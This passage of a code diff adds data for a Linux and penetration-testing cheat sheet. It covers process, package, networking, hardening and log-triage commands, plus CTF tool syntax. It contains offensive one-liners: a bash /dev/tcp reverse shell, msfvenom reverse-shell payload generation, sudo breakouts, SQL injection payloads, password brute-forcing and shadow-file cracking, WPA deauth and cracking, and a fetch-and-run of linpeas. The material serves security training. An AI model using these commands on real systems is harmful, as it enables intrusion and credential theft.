+      ["top","Live, sorted view of running processes",[["top","Default CPU-sorted view"],["top -u user","Filter by user"]]],
+      ["htop","Interactive, friendlier process viewer",[["htop","Launch the interactive UI"]]],
+      ["kill","Send a signal to a process",[["kill PID","Ask a process to stop"],["kill -9 PID","Force-terminate a process"]]],
+      ["killall","Kill processes by name",[["killall name","Terminate all matching processes"]]],
+      ["uname","Print system information",[["uname -a","Full system & kernel info"],["uname -r","Kernel release only"]]],
+      ["uptime","Show how long the system has run",[["uptime -p","Human-readable uptime"]]],
+      ["history","Show previously run commands",[["history","Full command history"],["history 20","Last 20 commands"]]],
+      ["man","Show the manual page for a command",[["man cmd","Read a command's manual"],["man -k keyword","Search manual pages"]]],
+      ["date","Show or set the system date/time",[["date","Current date and time"],["date '+%s'","Unix epoch seconds"]]],
+    ]},
+    { t:'cards', cards:[
+      ["Inspecting processes","ps aux\nps -ef --forest\ntop / htop\npgrep -l nginx\npstree -p\nps aux --sort=-%mem | head\nstrace -p PID\nltrace -p PID"],
+      ["Controlling processes","kill -9 PID\nkill -15 PID\nkillall processname\npkill -f \"python script.py\"\nlsof -p 1234\nlsof -i :8080\nnohup cmd &\ndisown -a"],
+    ]},
+  ]},
+  { id:"sysinfo", title:"Users & System Info", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["whoami && id","Current user, groups, and UID"],
+      ["sudo -l","List commands this user can sudo"],
+      ["cat /etc/passwd","All system users"],
+      ["cat /etc/group","All groups"],
+      ["w / who / last","Logged-in users and login history"],
+      ["uname -a","Kernel version and architecture"],
+      ["cat /etc/os-release","Distro name and version"],
+      ["env / printenv","Environment variables"],
+      ["history","Command history for this session"],
+      ["echo $PATH","Executable search path"],
+    ]},
+  ]},
+]},
+{ title:"Packages, Disk & Archives", desc:"Installing software and managing storage.", groups:[
+  { id:"packages", title:"Package Management", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["tar -xzvf file.tar.gz","Extract a gzipped tarball"],
+      ["tar -czvf out.tar.gz dir/","Create a gzipped tarball"],
+      ["unzip file.zip -d out/","Extract a zip archive"],
+      ["apt update && apt install pkg","Install a package (Debian/Ubuntu)"],
+      ["apt list --installed","List installed apt packages"],
+      ["dpkg -l","List installed packages (Debian)"],
+      ["rpm -qa","List installed packages (RHEL/CentOS)"],
+    ]},
+    { t:'ex', items:[
+      ["apt","Debian/Ubuntu package manager",[["apt update","Refresh package lists"],["apt install pkg","Install a package"],["apt remove pkg","Remove a package"]]],
+      ["dpkg","Low-level Debian package tool",[["dpkg -l","List installed packages"],["dpkg -i file.deb","Install a local .deb"]]],
+      ["pacman","Arch Linux package manager",[["pacman -Syu","Update the system"],["pacman -S pkg","Install a package"]]],
+      ["yum","RHEL/CentOS package manager",[["yum install pkg","Install a package"],["yum update","Update all packages"]]],
+      ["rpm","Low-level RedHat package tool",[["rpm -qa","List installed packages"]]],
+    ]},
+    { t:'cards', cards:[
+      ["Debian / Ubuntu / Kali","sudo apt update && sudo apt full-upgrade -y\nsudo apt install nmap wireshark gobuster\nsudo apt remove package\nsudo apt purge package\nsudo apt autoremove\napt list --installed | grep nginx\ndpkg -L package\ndpkg -S /usr/bin/nmap"],
+      ["Red Hat / Fedora","sudo dnf update\nsudo dnf install package\nsudo dnf remove package\nrpm -qa | grep httpd\nrpm -qi package\nrpm -ql package"],
+      ["Arch","sudo pacman -Syu\nsudo pacman -S package\nsudo pacman -R package\npacman -Qs package\npacman -Qi package"],
+      ["Universal / language-level","pip install package\npip list --outdated\nsnap install package\nflatpak install package\ngem install package\nnpm install -g package"],
+    ]},
+  ]},
+  { id:"disk", title:"Disk, Mounts & Archives", blocks:[
+    { t:'ex', items:[
+      ["du","Estimate file/directory space usage",[["du -sh dir/","Total size of a directory"],["du -sh *","Size of everything here"]]],
+      ["df","Report filesystem disk space usage",[["df -h","Human-readable disk usage"]]],
+      ["tar","Archive files, optionally with compression",[["tar -czvf out.tar.gz dir/","Create a gzipped archive"],["tar -xzvf file.tar.gz","Extract a gzipped archive"]]],
+      ["zip / unzip","Create or extract ZIP archives",[["zip -r out.zip dir/","Create a zip archive"],["unzip file.zip","Extract a zip archive"]]],
+      ["dd","Copy and convert raw data, create disk images",[["dd if=/dev/sda of=img.img bs=1M","Image a whole disk"],["dd if=/dev/zero of=file bs=1M count=10","Create a 10MB file of zeros"]]],
+      ["mount / umount","Attach or detach a filesystem",[["mount /dev/sdb1 /mnt/usb","Mount a device"],["umount /mnt/usb","Unmount it"]]],
+      ["fdisk","View or edit disk partition tables",[["fdisk -l","List all disks and partitions"]]],
+    ]},
+    { t:'cards', cards:[
+      ["Disk usage","df -h\ndu -sh * | sort -h\ndu -ah | sort -rh | head -20\nlsblk\nfdisk -l\nmount /dev/sdb1 /mnt/usb\numount /mnt/usb\nblkid"],
+      ["Archiving","tar -czvf out.tar.gz folder/\ntar -xzvf out.tar.gz\ntar -tvf out.tar.gz\nzip -r out.zip folder/\nunzip -l out.zip\ngzip file.txt\ngunzip file.txt.gz\n7z x archive.7z"],
+    ]},
+  ]},
+]},
+{ title:"Networking & Remote Access", desc:"Connectivity, transfers, tunnels, and getting a working shell on the other end.", groups:[
+  { id:"networking", title:"Networking", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["ip a / ip route","Interfaces & IPs / routing table"],
+      ["ss -tulpn","Listening ports with owning PID"],
+      ["ss -tn state established","Active established connections"],
+      ["dig example.com ANY","DNS lookup, all record types"],
+      ["dig axfr @ns example.com","Attempt a DNS zone transfer"],
+      ["curl -I http://target","View response headers only"],
+      ["traceroute target","Trace the network path to a host"],
+      ["nc -zv IP 1-1000","Netcat as a simple port scanner"],
+    ]},
+    { t:'simple', rows:[
+      ["ip a","Show every network interface and its assigned addresses.","ip a show eth0"],
+      ["ss -tulnp","List all listening TCP/UDP ports and the process holding each one.","ss -tulnp"],
+      ["curl -I url","Fetch only the HTTP response headers from a URL.","curl -I https://example.com"],
+      ["dig domain type","Query DNS directly for a specific record type.","dig example.com MX"],
+      ["traceroute host","Trace the network path to a host, hop by hop.","traceroute 8.8.8.8"],
+      ["nmap -sV target","Scan a host for open ports and identify the service versions behind them.","nmap -sV 192.168.1.1"],
+      ["tcpdump -i eth0","Capture and inspect live packets on a given interface.","tcpdump -i eth0 port 443"],
+      ["wget url","Download a file over HTTP or HTTPS from the command line.","wget -q https://site.com/file.zip"],
+      ["ufw allow port","Manage firewall rules to allow or block specific ports.","ufw allow 22/tcp"],
+      ["scp file user@host:path","Copy a file to or from a remote machine securely over SSH.","scp report.pdf user@10.0.0.5:/tmp"],
+      ["netstat -plant","Legacy view of active connections and listening ports with owning PIDs.","netstat -plant"],
+      ["hostname -I","Show the machine's local IP address(es).","hostname -I"],
+      ["whois domain","Look up registration and ownership records for a domain.","whois example.com"],
+      ["iftop -i eth0","Monitor real-time bandwidth usage per connection on an interface.","iftop -i eth0"],
+      ["openssl s_client -connect host:443","Inspect a remote host's TLS certificate and handshake.","openssl s_client -connect example.com:443"],
+    ]},
+    { t:'ex', items:[
+      ["ip","Show/manipulate network interfaces & routes",[["ip a","IPs on all interfaces"],["ip route","Routing table"]]],
+      ["ping","Send ICMP echo requests to a host",[["ping host","Continuous ping"],["ping -c 4 host","Send exactly 4 packets"]]],
+      ["ssh","Connect to a remote host securely",[["ssh user@host","Connect as a user"],["ssh -p 2222 user@host","Connect on a custom port"]]],
+      ["scp","Copy files securely over SSH",[["scp file user@host:/path/","Upload a file"],["scp -r dir user@host:/path/","Upload a directory"]]],
+      ["wget","Download files from the web",[["wget URL","Download a file"],["wget -O name URL","Save with a custom name"]]],
+      ["curl","Transfer data to/from a server",[["curl URL","Print response body"],["curl -O URL","Save with the remote filename"],["curl -I URL","Headers only"]]],
+      ["nc","Read/write raw data over network connections",[["nc host port","Connect to a host and port"],["nc -lvnp port","Listen for a connection"]]],
+      ["dig","Query DNS servers",[["dig domain","Standard DNS lookup"],["dig -x IP","Reverse DNS lookup"]]],
+      ["netstat","Show connections, routing tables, stats",[["netstat -tulpn","Listening ports and owning process"]]],
+      ["tcpdump","Capture and inspect network traffic",[["tcpdump -i eth0","Capture on an interface"],["tcpdump host IP","Capture traffic for one host"]]],
+      ["nmap","Network exploration and port scanning",[["nmap host","Basic scan"],["nmap -sS host","Stealth SYN scan"],["nmap -O host","OS detection"]]],
+    ]},
+    { t:'cards', cards:[
+      ["Interfaces & routes","ip addr show\nip link set eth0 up\nip route show\nss -tulpn\nss -s\narp -a\nhostname -I"],
+      ["DNS & connectivity","dig example.com\ndig -x 8.8.8.8\nnslookup example.com\nhost example.com\nping -c 4 8.8.8.8\ntraceroute example.com\nmtr example.com"],
+      ["Capture & transfer","tcpdump -i eth0 -w cap.pcap\ntcpdump -r cap.pcap 'port 80'\npython3 -m http.server 8080\nwget url\ncurl -O url\ncurl -I url\nrsync -avz src/ user@host:/dst/"],
+      ["Scanning & listeners","nc -lvnp 1234\nnc -zv host 1-1000\nnmap -sV host\nnmap -p- host\nscp file user@ip:/tmp"],
+    ]},
+  ]},
+  { id:"transfer", title:"File Transfer", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["python3 -m http.server 8000","Quick HTTP file server"],
+      ["wget http://IP:8000/file","Download a file"],
+      ["scp file user@IP:/path/","Secure copy over SSH"],
+      ["nc -lvnp 9999 > file","Receive a file with netcat"],
+      ["nc IP 9999 < file","Send a file with netcat"],
+      ["base64 file | tr -d '\\n'","Encode a file for text-only transfer"],
+    ]},
+  ]},
+  { id:"ssh", title:"SSH & Tunneling", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["ssh -L 8080:127.0.0.1:80 user@IP","Local port forward"],
+      ["ssh -R 8080:127.0.0.1:80 user@IP","Remote port forward"],
+      ["ssh -D 1080 user@IP","Dynamic SOCKS5 proxy"],
+      ["proxychains nmap -sT IP","Route a tool through a SOCKS proxy"],
+      ["chisel server --reverse -p 8000","Chisel reverse tunnel server"],
+      ["chisel client IP:8000 R:1080:socks","Chisel reverse SOCKS client"],
+    ]},
+    { t:'cards', cards:[
+      ["Connecting","ssh user@host\nssh -i key.pem user@host\nssh -p 2222 user@host\nssh -v user@host\nssh user@host \"uptime\"\nsshpass -p pass ssh user@host"],
+      ["Keys & tunnels","ssh-keygen -t ed25519\nssh-copy-id user@host\nssh -L 8080:localhost:80 user@host\nssh -D 1080 user@host\nssh -N -f -L 3306:localhost:3306 user@host\nscp -r folder/ user@host:/path/"],
+    ]},
+  ]},
+  { id:"revshell", title:"Reverse Shells & TTY Upgrade", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["bash -i >&/dev/tcp/IP/4444 0>&1","Bash TCP reverse shell"],
+      ["nc -lvnp 4444","Netcat listener"],
+      ["python3 -c 'import pty; pty.spawn(\"/bin/bash\")'","Upgrade to a pseudo-terminal"],
+      ["Ctrl+Z then: stty raw -echo; fg","Background the shell, fix raw terminal"],
+      ["export TERM=xterm","Fix terminal capability issues"],
+      ["stty rows 40 cols 160","Match remote TTY size to local window"],
+    ]},
+    { t:'cards', cards:[
+      ["Shell upgrade","python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nstty raw -echo; fg\nexport TERM=xterm\nscript /dev/null -c bash"],
+    ]},
+  ]},
+]},
+{ title:"Scripting & Automation", desc:"Turning one-liners into repeatable scripts and scheduled jobs.", groups:[
+  { id:"bash", title:"Bash Scripting", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["#!/bin/bash + chmod +x","Declare the interpreter and make a script file executable.","chmod +x deploy.sh"],
+      ["read -p \"prompt\" var","Prompt the user and store their typed input in a variable.","read -p \"Name: \" name"],
+      ["if / elif / else / fi","Branch script logic based on a test condition.","if [ -f file ]; then echo found; fi"],
+      ["for x in list; do","Loop over a list of items, running a block for each.","for f in *.log; do echo $f; done"],
+      ["while read line; do","Repeat a block for as long as a condition holds, often reading input line by line.","while read line; do echo $line; done < file"],
+      ["name(){ ...; }","Define a reusable function inside a script.","backup(){ tar -czf $1.tar.gz $1; }"],
+      ["$(command)","Capture a command's output and store it in a variable.","now=$(date +%F)"],
+      ["trap 'cmd' EXIT","Run a cleanup command automatically when the script exits or is interrupted.","trap \"rm -f $tmp\" EXIT"],
+      ["grep / awk / sed","Filter, extract fields from, and rewrite text streams.","awk -F: '{print $1}' /etc/passwd"],
+      ["echo $?","Check the exit status of the last command — 0 means success.","cmd; echo $?"],
+      ["case $var in","Match one variable against multiple patterns, cleaner than nested if/else.","case $1 in start) echo go;; esac"],
+      ["array=(a b c)","Define a bash array and loop over its elements.","for i in \"${array[@]}\"; do echo $i; done"],
+      ["set -euo pipefail","Make a script fail fast on errors, unset variables, or failed pipes.","set -euo pipefail"],
+      ["until cmd; do","Loop repeatedly until a condition finally becomes true.","until ping -c1 host; do sleep 1; done"],
+      ["source file.sh","Load variables and functions from another script into the current shell.","source ~/.bashrc"],
+    ]},
+    { t:'cards', cards:[
+      ["Sample script","#!/bin/bash\nTARGET=\"10.10.10.10\"\n\nif [ \"$1\" == \"--help\" ]; then\n  echo \"usage: $0 [--help]\"\nfi\n\nfor port in 22 80 443; do\n  echo \"checking $port\"\ndone\n\nwhile read -r line; do\n  echo \"$line\"\ndone < file.txt"],
+    ]},
+  ]},
+  { id:"systemd-cron", title:"systemd & Cron", blocks:[
+    { t:'cards', cards:[
+      ["Services","systemctl start|stop|restart nginx\nsystemctl enable nginx\nsystemctl disable nginx\nsystemctl status nginx\nsystemctl list-units --type=service\nsystemctl mask nginx\njournalctl -u nginx -f\njournalctl -u nginx --since today"],
+      ["Scheduled jobs","crontab -e\ncrontab -l\ncrontab -r\n0 3 * * * /opt/scripts/backup.sh\n*/5 * * * * /opt/scripts/check.sh\nsystemctl list-timers\nat 10pm\natq"],
+    ]},
+  ]},
+]},
+{ title:"Security, Hardening & Auditing", desc:"Locking a system down, watching for trouble, and enumerating a path up to root.", groups:[
+  { id:"privesc", title:"Privilege-Escalation Enumeration", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["sudo -l","List allowed sudo commands"],
+      ["find / -perm -4000 2>/dev/null","SUID binaries"],
+      ["cat /etc/crontab /etc/cron.*","Cron jobs, check for writable scripts"],
+      ["find / -writable -not -path \"/proc/*\" 2>/dev/null","World-writable files, excluding /proc"],
+      ["sudo awk 'BEGIN{system(\"/bin/bash\")}'","GTFOBins-style sudo breakout via awk"],
+      ["sudo find / -exec /bin/bash \\; -quit","GTFOBins-style sudo breakout via find"],
+      ["docker run -v /:/mnt -it alpine chroot /mnt","Docker-group host escalation"],
+      ["/usr/bin/bash -p","SUID bash breakout, preserves effective UID"],
+    ]},
+    { t:'cards', cards:[
+      ["Privilege escalation checks","sudo -l\nfind / -perm -4000 2>/dev/null\ngetcap -r / 2>/dev/null\ncat /etc/crontab\nfind / -writable -type d 2>/dev/null | grep -v proc"],
+    ]},
+  ]},
+  { id:"hardening", title:"Security Hardening", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["ufw default deny incoming","Set a default-deny firewall posture, allowing only what you explicitly open.","ufw default deny incoming"],
+      ["fail2ban-client status","Check active jail status for automatic IP bans after repeated failed logins.","fail2ban-client status sshd"],
+      ["PermitRootLogin no","Disable direct root login over SSH in sshd_config, forcing key-based sudo access.","sed -i 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config"],
+      ["lynis audit system","Run a full automated security audit and get a hardening score with findings.","lynis audit system"],
+      ["ausearch -m avc","Search the audit log for access-denied and policy-violation events.","ausearch -m avc -ts recent"],
+      ["unattended-upgrade --dry-run","Preview or apply automatic security patches without a manual update cycle.","unattended-upgrade --dry-run"],
+      ["chattr +i file","Make a file immutable so it can't be modified or deleted, even by root.","chattr +i /etc/passwd"],
+      ["aa-status","Check which AppArmor profiles are loaded and enforcing.","aa-status"],
+      ["find / -perm -4000","Locate SUID binaries on the system — a classic privilege-escalation vector.","find / -perm -4000 2>/dev/null"],
+      ["rkhunter --check","Scan the system for known rootkits, backdoors, and local exploits.","rkhunter --check"],
+      ["sysctl -w net.ipv4.ip_forward=0","Tune a kernel security parameter at runtime.","sysctl -w net.ipv4.ip_forward=0"],
+      ["openssl rand -base64 32","Generate a strong random secret or key.","openssl rand -base64 32"],
+      ["ssh-keygen -t ed25519","Generate a modern SSH keypair for passwordless, safer authentication.","ssh-keygen -t ed25519 -C \"zaber@ewu\""],
+      ["journalctl -xe","Review recent system logs with extra context, useful during an incident.","journalctl -xe"],
+      ["clamscan -r /path","Recursively scan a directory for malware signatures.","clamscan -r /var/www"],
+    ]},
+    { t:'cards', cards:[
+      ["SSH config (/etc/ssh/sshd_config)","PermitRootLogin no\nPasswordAuthentication no\nMaxAuthTries 3\nAllowUsers admin\nPort 2222\nsudo systemctl restart sshd"],
+      ["Firewall & logs","ufw enable\nufw allow ssh\nufw allow from 10.0.0.0/24\nufw deny 23\nufw status verbose\ngrep Failed /var/log/auth.log\ngrep \"session opened\" /var/log/auth.log"],
+      ["Password & account policy","chage -M 90 username\npasswd -l username\nsudo apt install libpam-pwquality\necho \"minlen=12\" >> /etc/security/pwquality.conf"],
+      ["Update discipline","sudo unattended-upgrades --dry-run\napt list --upgradable\nsudo apt-get -s upgrade"],
+    ]},
+  ]},
+  { id:"logs", title:"Logs, Auditing & Incident Triage", blocks:[
+    { t:'cards', cards:[
+      ["Auth log triage","grep \"Failed password\" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr\ngrep \"Accepted\" /var/log/auth.log | awk '{print $9,$11}'\nawk '/Failed password/{print $(NF-3)}' auth.log | sort | uniq -c | sort -rn | head"],
+      ["Web log triage","awk '{print $1}' access.log | sort | uniq -c | sort -nr | head\ngrep -E \"POST|PUT\" access.log | awk '{print $7}'\nawk '$9 ~ /5[0-9][0-9]/' access.log"],
+      ["Process / network anomalies","ps aux | awk '{print $1}' | sort | uniq -c | sort -nr\nnetstat -tulpn | grep ESTABLISHED\nlsof -i -P -n | grep -v LISTEN"],
+      ["File & hash checks","find / -mtime -1 -type f 2>/dev/null | grep -v proc\nmd5sum suspicious_bin\nsha256sum -c checksums.txt\ndiff <(md5sum -- *) baseline.md5"],
+      ["journalctl","journalctl -xe\njournalctl --since \"1 hour ago\"\njournalctl -k -b\njournalctl -p err\njournalctl -f\njournalctl --disk-usage\njournalctl _PID=1234"],
+      ["auditd","sudo apt install auditd\nauditctl -w /etc/passwd -p wa -k passwd_watch\nauditctl -w /etc/sudoers -p wa -k sudoers_watch\nausearch -k passwd_watch\nausearch -m USER_LOGIN\naureport --summary"],
+      ["Log rotation","cat /etc/logrotate.conf\nlogrotate -f /etc/logrotate.d/nginx\nlogrotate -d /etc/logrotate.conf"],
+      ["Who did what","last -a\nlastb\nw\nwho\nhistory | tail -50\nHISTTIMEFORMAT=\"%F %T \" history\nutmpdump /var/log/wtmp"],
+    ]},
+  ]},
+  { id:"firewall", title:"Firewall — iptables / nftables", blocks:[
+    { t:'cards', cards:[
+      ["iptables basics","iptables -L -n -v\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -s 10.0.0.5 -j DROP\niptables -A INPUT -j DROP\niptables -D INPUT 1\niptables-save > rules.v4\niptables-restore < rules.v4"],
+      ["nftables (modern)","nft list ruleset\nnft add table inet filter\nnft add chain inet filter input { type filter hook input priority 0 ; }\nnft add rule inet filter input tcp dport 22 accept\nnft add rule inet filter input drop\nnft flush ruleset"],
+    ]},
+  ]},
+  { id:"kernel-sysctl", title:"Kernel & Sysctl Tuning", blocks:[
+    { t:'cards', cards:[
+      ["Runtime kernel params","sysctl -a | grep ip_forward\nsysctl -w net.ipv4.ip_forward=1\nsysctl -p\nuname -r\nlsmod\nmodprobe module_name\ndmesg | tail -50"],
+      ["Security-relevant flags (/etc/sysctl.conf)","net.ipv4.conf.all.rp_filter=1\nnet.ipv4.tcp_syncookies=1\nkernel.randomize_va_space=2\nnet.ipv4.icmp_echo_ignore_broadcasts=1\nnet.ipv4.conf.all.accept_source_route=0\nfs.suid_dumpable=0"],
+    ]},
+  ]},
+  { id:"selinux-apparmor", title:"SELinux / AppArmor", blocks:[
+    { t:'cards', cards:[
+      ["SELinux (RHEL/Fedora)","getenforce\nsetenforce 1\nsestatus\nsemanage port -l\nls -Z /var/www/html\nrestorecon -Rv /var/www\naudit2allow -a"],
+      ["AppArmor (Debian/Ubuntu)","aa-status\naa-enforce /etc/apparmor.d/profile\naa-complain /etc/apparmor.d/profile\naa-genprof /usr/bin/app\napparmor_parser -r /etc/apparmor.d/profile"],
+    ]},
+  ]},
+  { id:"malware-integrity", title:"File Integrity & Malware Scanning", blocks:[
+    { t:'cards', cards:[
+      ["Rootkit / malware checks","sudo apt install rkhunter chkrootkit lynis\nrkhunter --update\nrkhunter --check\nchkrootkit\nlynis audit system\nclamscan -r /home --bell -i\nfreshclam"],
+      ["File integrity (AIDE)","sudo apt install aide\naideinit\naide --check\naide --update\ndiff /var/lib/aide/aide.db.new /var/lib/aide/aide.db"],
+    ]},
+  ]},
+  { id:"containers", title:"Container Security", blocks:[
+    { t:'cards', cards:[
+      ["Docker inspection","docker ps -a\ndocker inspect container_id\ndocker logs -f container_id\ndocker exec -it container_id sh\ndocker stats\ndocker top container_id"],
+      ["Hardening","docker run --read-only --cap-drop=ALL image\ndocker run --security-opt=no-new-privileges image\ndocker scan image\ntrivy image image_name\ndocker network inspect bridge\ndocker system prune -a"],
+    ]},
+  ]},
+  { id:"advanced-audit", title:"Advanced User & Access Auditing", blocks:[
+    { t:'cards', cards:[
+      ["Sudo & fail2ban","sudo apt install fail2ban\nfail2ban-client status sshd\nfail2ban-client set sshd unbanip 1.2.3.4\nvisudo -c\ncat /etc/sudoers.d/*\njournalctl -u fail2ban"],
+      ["Account hygiene","awk -F: '$3 == 0 {print $1}' /etc/passwd\nawk -F: '($2==\"\"){print $1}' /etc/shadow\nchage -l username\nlslogins -L\nwho -u\ndeluser --remove-home name"],
+    ]},
+  ]},
+  { id:"crypto", title:"Crypto & Encoding", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["echo 'str' | base64","Base64 encode"],
+      ["echo 'c3Ry' | base64 -d","Base64 decode"],
+      ["echo -n 'str' | xxd -p","Hex encode"],
+      ["openssl rsa -in priv.pem -text -noout","Inspect an RSA private key"],
+      ["openssl s_client -connect site.com:443","Inspect a remote TLS certificate"],
+    ]},
+  ]},
+]},
+{ title:"Editors & Version Control", desc:"Shaping your shell session and tracking changes.", groups:[
+  { id:"editors", title:"Editors & Shell Environment", blocks:[
+    { t:'ex', items:[
+      ["nano","Simple, beginner-friendly text editor",[["nano file","Open a file to edit"],["Ctrl+O then Ctrl+X","Save and exit"]]],
+      ["vi / vim","Modal, keyboard-driven text editor",[["vi file","Open a file"],["i then Esc","Enter/exit insert mode"],[":wq","Save and quit"]]],
+      ["echo","Print text or a variable's value",[["echo \"text\"","Print a string"],["echo $PATH","Print an environment variable"]]],
+      ["export","Set an environment variable",[["export VAR=value","Set for this session"]]],
+      ["clear","Clear the terminal screen",[["clear","Wipe the visible screen"]]],
+      ["hostname","Show or set the system's hostname",[["hostname","Show current hostname"],["hostname -I","Show the system's IP address"]]],
+    ]},
+  ]},
+  { id:"git", title:"Version Control (Git)", blocks:[
+    { t:'ex', items:[
+      ["git","Distributed version control system",[["git init","Start a new repository"],["git clone URL","Copy a remote repository"],["git add file","Stage a change"],["git commit -m \"msg\"","Save a snapshot"],["git push","Send commits to the remote"],["git pull","Fetch and merge from the remote"]]],
+    ]},
+  ]},
+]},
+{ title:"CTF & Pentest Toolkits", desc:"Quick-reference syntax for the tools members use most during labs and CTFs.", groups:[
+  { id:"tool-nmap", title:"Nmap", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["nmap -sn 192.168.1.0/24","Ping sweep to find live hosts"],
+      ["nmap -p- --min-rate 5000 target","Fast full port-range scan"],
+      ["nmap -sC -sV -p PORTS target","Default scripts + version detection"],
+      ["nmap -A -T4 target","Aggressive: OS, version, scripts, traceroute"],
+      ["nmap -sU --top-ports 20 target","Quick UDP scan"],
+      ["nmap --script=vuln target","Run all vulnerability-detection scripts"],
+      ["nmap -oA results target","Save output in all formats at once"],
+      ["nmap -Pn target","Skip host discovery, treat as up"],
+    ]},
+  ]},
+  { id:"tool-web", title:"Gobuster / ffuf / Nikto", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["gobuster dir -u URL -w list.txt -x php,txt","Directory brute-force with extensions"],
+      ["gobuster vhost -u URL -w subs.txt","Virtual-host enumeration"],
+      ["ffuf -u URL/FUZZ -w list.txt -mc 200,302","Directory fuzzing, match status codes"],
+      ["ffuf -u URL/login -X POST -d 'u=admin&p=FUZZ' -w pass.txt","Fuzz a POST parameter"],
+      ["feroxbuster -u URL -x php,html -t 100","Fast recursive content discovery"],
+      ["nikto -h http://target","General web vulnerability scan"],
+      ["whatweb -a 3 http://target","Aggressive tech-stack fingerprinting"],
+    ]},
+  ]},
+  { id:"tool-osint", title:"OSINT & Recon", level:'beg', blocks:[
+    { t:'simple', rows:[
+      ["whois target.com","Registrar & contact info"],
+      ["theHarvester -d target.com -b all","Emails, names, subdomains"],
+      ["amass enum -d target.com","Subdomain & attack-surface mapping"],
+      ["sherlock username","Find a username across social platforms"],
+      ["curl -s 'https://crt.sh/?q=%.target.com&output=json'","Certificate-transparency subdomain search"],
+      ["shodan host IP","Host info and open ports from Shodan"],
+    ]},
+  ]},
+  { id:"tool-sqli", title:"SQLmap & SQL Injection", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["sqlmap -u \"URL?id=1\" --dbs","Automated SQLi test, list databases"],
+      ["sqlmap -r req.txt --batch","Load a captured request from Burp"],
+      ["sqlmap -u URL -D db -T users --dump","Dump a table's contents"],
+      ["' OR 1=1 -- -","Classic manual auth-bypass payload"],
+      ["' UNION SELECT 1,2,3 -- -","Manual UNION-based column mapping"],
+      ["' AND SLEEP(5) -- -","Time-based blind SQLi check"],
+    ]},
+  ]},
+  { id:"tool-pass", title:"Hydra / John / Hashcat", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["hydra -l admin -P rockyou.txt IP ssh","Online SSH brute-force"],
+      ["hydra -L users.txt -P pass.txt IP http-post-form '/login:u=^USER^&p=^PASS^:F=fail'","HTTP form brute-force"],
+      ["john hash.txt --wordlist=rockyou.txt","Offline dictionary attack"],
+      ["unshadow /etc/passwd /etc/shadow > u.txt","Combine files for John"],
+      ["hashcat -m 0 -a 0 hash.txt rockyou.txt","MD5 dictionary attack"],
+      ["hashcat -m 1000 hash.txt rockyou.txt","NTLM dictionary attack"],
+      ["hashcat -m 0 -a 3 hash.txt ?l?l?l?l?d?d","Mask attack: 4 letters + 2 digits"],
+    ]},
+  ]},
+  { id:"tool-msf", title:"Metasploit", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["msfconsole -q","Start the console quietly"],
+      ["search type:exploit name:apache","Search modules"],
+      ["use exploit/multi/handler","Load a module"],
+      ["set RHOSTS/LHOST/LPORT ...","Configure target and callback"],
+      ["run / exploit -j","Execute, optionally as a background job"],
+      ["sessions -l / sessions -i 1","List / interact with sessions"],
+      ["msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o s.elf","Generate a Linux reverse-shell payload"],
+    ]},
+  ]},
+  { id:"tool-wireshark", title:"Wireshark / tshark", level:'int', blocks:[
+    { t:'simple', rows:[
+      ["ip.addr == 10.10.10.10","Filter by IP address"],
+      ["http.request.method == \"POST\"","Filter HTTP POST requests"],
+      ["tcp.flags.syn==1 && tcp.flags.ack==0","Filter SYN packets, spot scans"],
+      ["frame contains \"password\"","Search packet payloads for a string"],
+      ["tshark -r cap.pcap -Y http -T fields -e http.host","Extract HTTP hosts from a capture"],
+      ["tshark -i eth0 -w capture.pcap","Live capture to a file"],
+    ]},
+  ]},
+  { id:"tool-forensics", title:"Forensics & Volatility", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["file mystery_file","Identify file type by header"],
+      ["strings file | grep -i flag","Extract readable strings"],
+      ["binwalk -e file.bin","Extract embedded files"],
+      ["exiftool image.jpg","Read file metadata"],
+      ["vol3 -f mem.dmp windows.pslist","List processes from a memory dump"],
+      ["vol3 -f mem.dmp windows.hashdump","Dump SAM hashes from RAM"],
+    ]},
+  ]},
+  { id:"tool-wifi", title:"Wireless / Aircrack-ng", level:'adv', blocks:[
+    { t:'simple', rows:[
+      ["airmon-ng start wlan0","Enable monitor mode"],
+      ["airodump-ng wlan0mon","Scan nearby networks"],
+      ["airodump-ng -c 6 --bssid MAC -w cap wlan0mon","Capture a handshake on one network"],
+      ["aireplay-ng -0 5 -a BSSID wlan0mon","Deauth to force a handshake"],
+      ["aircrack-ng -w rockyou.txt cap-01.cap","Crack a captured WPA/WPA2 handshake"],
+    ]},
+  ]},
+  { id:"ctf-tricks", title:"CTF Tricks — Flags, Strings & Auto-Enum", level:'adv', blocks:[
+    { t:'cards', cards:[
+      ["Finding flags & strings","find / -name flag.txt 2>/dev/null\nfind / -iname \"*flag*\" 2>/dev/null\nstrings binary | grep -i FLAG\ngrep -r \"FLAG{\" / 2>/dev/null\nbinwalk -e image.jpg\nexiftool image.jpg\nsteghide extract -sf image.jpg"],
+      ["Automated enumeration","curl -O url/linpeas.sh; sh linpeas.sh\n./linenum.sh\nuname -a\ncat /etc/os-release"],
+    ]},
+    { t:'note', text:"Only run these techniques against systems you own or are explicitly authorized to test — unauthorized access is illegal in most jurisdictions." },
+  ]},
+]},
+{ title:"Lab Setup & Resources", desc:"Getting a practice environment running, and where to keep learning.", groups:[
+  { id:"lab-setup", title:"Lab Setup — Installing Kali Linux", blocks:[
+    { t:'cards', cards:[
